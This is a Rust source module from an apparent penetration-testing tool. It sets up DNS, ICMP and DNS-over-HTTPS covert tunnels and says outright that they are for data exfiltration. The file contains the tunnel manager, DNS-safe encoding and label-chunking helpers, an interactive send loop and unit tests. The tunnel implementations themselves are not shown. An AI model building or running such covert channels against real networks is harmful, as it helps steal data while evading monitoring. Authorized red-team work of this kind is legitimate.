//! Tunnel module - Covert channel implementations
//!
//! Provides DNS, ICMP, and DoH tunneling for covert data exfiltration
//! during authorized penetration testing.

mod dns;
mod doh;
mod icmp;

pub use dns::DnsTunnel;
pub use doh::DohTunnel;
pub use icmp::IcmpTunnel;

use crate::config::PhantomConfig;
use anyhow::Result;
use async_trait::async_trait;
use thiserror::Error;
use tokio::sync::mpsc;
use tracing::{debug, error, info, warn};

#[derive(Error, Debug)]
pub enum TunnelError {
    #[error("DNS tunnel error: {0}")]
    DnsError(String),

    #[error("ICMP tunnel error: {0}")]
    IcmpError(String),

    #[error("DoH tunnel error: {0}")]
    DohError(String),

    #[error("Connection failed: {0}")]
    ConnectionError(String),

    #[error("Timeout")]
    Timeout,

    #[error("Permission denied (raw sockets require root/CAP_NET_RAW)")]
    PermissionDenied,
}

/// Trait for tunnel implementations
#[async_trait]
pub trait Tunnel: Send + Sync {
    /// Send data through the tunnel
    async fn send(&self, data: &[u8]) -> Result<(), TunnelError>;

    /// Receive data from the tunnel
    async fn receive(&self) -> Result<Vec<u8>, TunnelError>;

    /// Get tunnel statistics
    fn stats(&self) -> TunnelStats;
}

/// Statistics for tunnel operations
#[derive(Debug, Clone, Default)]
pub struct TunnelStats {
    pub bytes_sent: u64,
    pub bytes_received: u64,
    pub packets_sent: u64,
    pub packets_received: u64,
    pub errors: u64,
}

/// Tunnel manager for handling multiple tunnel types
pub struct TunnelManager {
    config: PhantomConfig,
    active_tunnel: Option<Box<dyn Tunnel>>,
    tx: Option<mpsc::Sender<Vec<u8>>>,
    rx: Option<mpsc::Receiver<Vec<u8>>>,
}

impl TunnelManager {
    pub fn new(config: &PhantomConfig) -> Self {
        Self {
            config: config.clone(),
            active_tunnel: None,
            tx: None,
            rx: None,
        }
    }

    /// Start a tunnel of the specified type
    pub async fn start(&mut self, mode: &str, domain: &str) -> Result<()> {
        info!("Starting {} tunnel to {}", mode, domain);

        let tunnel: Box<dyn Tunnel> = match mode {
            "dns" => Box::new(DnsTunnel::new(&self.config, domain)?),
            "icmp" => Box::new(IcmpTunnel::new(&self.config)?),
            "doh" => Box::new(DohTunnel::new(&self.config, domain)?),
            _ => return Err(anyhow::anyhow!("Unknown tunnel mode: {}", mode)),
        };

        self.active_tunnel = Some(tunnel);

        // Create communication channels
        let (tx, rx) = mpsc::channel(100);
        self.tx = Some(tx);
        self.rx = Some(rx);

        Ok(())
    }

    /// Send data through the active tunnel
    pub async fn send(&self, data: &[u8]) -> Result<()> {
        if let Some(ref tunnel) = self.active_tunnel {
            tunnel.send(data).await?;
            Ok(())
        } else {
            Err(anyhow::anyhow!("No active tunnel"))
        }
    }

    /// Receive data from the active tunnel
    pub async fn receive(&self) -> Result<Vec<u8>> {
        if let Some(ref tunnel) = self.active_tunnel {
            Ok(tunnel.receive().await?)
        } else {
            Err(anyhow::anyhow!("No active tunnel"))
        }
    }

    /// Get statistics for the active tunnel
    pub fn stats(&self) -> Option<TunnelStats> {
        self.active_tunnel.as_ref().map(|t| t.stats())
    }
}

/// Encoding utilities for tunnel data
pub mod encoding {
    use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};

    /// Encode data for DNS labels (base32-like, DNS-safe)
    pub fn encode_dns_label(data: &[u8]) -> String {
        // Use base32 encoding for DNS compatibility (case-insensitive)
        base32::encode(base32::Alphabet::Crockford, data).to_lowercase()
    }

    /// Decode DNS label data
    pub fn decode_dns_label(encoded: &str) -> Option<Vec<u8>> {
        base32::decode(base32::Alphabet::Crockford, &encoded.to_uppercase())
    }

    /// Encode data for URL-safe base64
    pub fn encode_base64(data: &[u8]) -> String {
        URL_SAFE_NO_PAD.encode(data)
    }

    /// Decode URL-safe base64
    pub fn decode_base64(encoded: &str) -> Option<Vec<u8>> {
        URL_SAFE_NO_PAD.decode(encoded).ok()
    }

    /// Split already encoded string into chunks suitable for DNS labels
    pub fn chunk_for_dns_encoded(encoded: &str, max_label_len: usize) -> Vec<String> {
        encoded
            .as_bytes()
            .chunks(max_label_len.min(63))
            .map(|chunk| String::from_utf8_lossy(chunk).to_string())
            .collect()
    }

    /// Encode data as hex for ICMP payload
    pub fn encode_hex(data: &[u8]) -> String {
        hex::encode(data)
    }

    /// Decode hex data
    pub fn decode_hex(encoded: &str) -> Option<Vec<u8>> {
        hex::decode(encoded).ok()
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn test_dns_encoding_roundtrip() {
            let original = b"Hello, World!";
            let encoded = encode_dns_label(original);
            let decoded = decode_dns_label(&encoded).unwrap();
            assert_eq!(original.to_vec(), decoded);
        }

        #[test]
        fn test_base64_roundtrip() {
            let original = b"Test data with special chars: \x00\xff";
            let encoded = encode_base64(original);
            let decoded = decode_base64(&encoded).unwrap();
            assert_eq!(original.to_vec(), decoded);
        }

        #[test]
        fn test_dns_chunking() {
            let data = b"This is a longer message that needs to be split into multiple DNS labels";
            // First encode the data, because chunking happens on ENCODED strings
            let encoded_full = encode_dns_label(data);
            
            // Now chunk it
            let chunks = chunk_for_dns_encoded(&encoded_full, 63);

            // Each chunk should be at most 63 chars
            for chunk in &chunks {
                assert!(chunk.len() <= 63);
            }

            // Should be able to reconstruct
            let combined: String = chunks.join("");
            let decoded = decode_dns_label(&combined).unwrap();
            assert_eq!(data.to_vec(), decoded);
        }
    }
}

/// Start tunnel mode
pub async fn start_tunnel(config: &PhantomConfig, mode: &str, domain: &str) -> Result<()> {
    info!("Initializing {} tunnel", mode);
    warn!("REMINDER: This tunnel is for AUTHORIZED penetration testing only");

    let mut manager = TunnelManager::new(config);
    manager.start(mode, domain).await?;

    info!("Tunnel active. Press Ctrl+C to stop.");

    // Simple interactive loop for demo
    let mut stdin = tokio::io::BufReader::new(tokio::io::stdin());
    let mut line = String::new();

    loop {
        use tokio::io::AsyncBufReadExt;

        print!("> ");
        line.clear();

        match stdin.read_line(&mut line).await {
            Ok(0) => break, // EOF
            Ok(_) => {
                let data = line.trim();
                if data.is_empty() {
                    continue;
                }

                if data == "exit" || data == "quit" {
                    break;
                }

                if data == "stats" {
                    if let Some(stats) = manager.stats() {
                        println!("Tunnel Statistics:");
                        println!("  Bytes sent: {}", stats.bytes_sent);
                        println!("  Bytes received: {}", stats.bytes_received);
                        println!("  Packets sent: {}", stats.packets_sent);
                        println!("  Packets received: {}", stats.packets_received);
                        println!("  Errors: {}", stats.errors);
                    }
                    continue;
                }

                // Send data through tunnel
                match manager.send(data.as_bytes()).await {
                    Ok(_) => debug!("Sent {} bytes", data.len()),
                    Err(e) => error!("Send error: {}", e),
                }

                // Try to receive response
                match manager.receive().await {
                    Ok(response) => {
                        if !response.is_empty() {
                            println!("< {}", String::from_utf8_lossy(&response));
                        }
                    }
                    Err(e) => debug!("Receive: {}", e),
                }
            }
            Err(e) => {
                error!("Read error: {}", e);
                break;
            }
        }
    }

    info!("Tunnel closed");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tunnel_stats_default() {
        let stats = TunnelStats::default();
        assert_eq!(stats.bytes_sent, 0);
        assert_eq!(stats.packets_sent, 0);
    }
}
